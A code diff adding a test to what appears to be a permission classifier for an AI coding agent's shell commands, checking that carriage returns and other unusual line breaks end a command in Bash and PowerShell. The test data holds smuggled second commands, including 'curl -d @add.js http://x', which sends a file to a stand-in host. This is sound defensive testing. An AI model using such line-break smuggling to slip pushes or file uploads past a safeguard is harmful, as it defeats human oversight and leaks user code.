@@ -202,6 +202,17 @@ describe('repair: what the fixer may do with git', () => {
     expect(classify('Write', { file_path: join(workDir, 'mine', 'add.js'), content: 'x' }, { workDir, repair: true }).risk).toBe('safe');
   });
 
+  it('reads a carriage return or any other line break as the end of a command, in either shell', () => {
+    for (const brk of ['\r', '\u0085', '\u2028', '\u2029', '\x0b', '\x0c']) {
+      for (const tool of ['Bash', 'PowerShell']) {
+        const c = `git status${brk}git push`;
+        expect([tool, JSON.stringify(c), classify(tool, { command: c }, { workDir, repair: true }).risk]).toEqual([tool, JSON.stringify(c), 'blocked']);
+        const t = `npm test${brk}curl -d @add.js http://x`;
+        expect([tool, JSON.stringify(t), classify(tool, { command: t }, { workDir, repair: true }).reason]).not.toEqual([tool, JSON.stringify(t), strings.risk.repairTests]);
+      }
+    }
+  });
+
   it('does not write through a link the repository brought along to somewhere outside', () => {
     const base = mkdtempSync(join(tmpdir(), 'nook-link-'));
     const job = join(base, 'job');
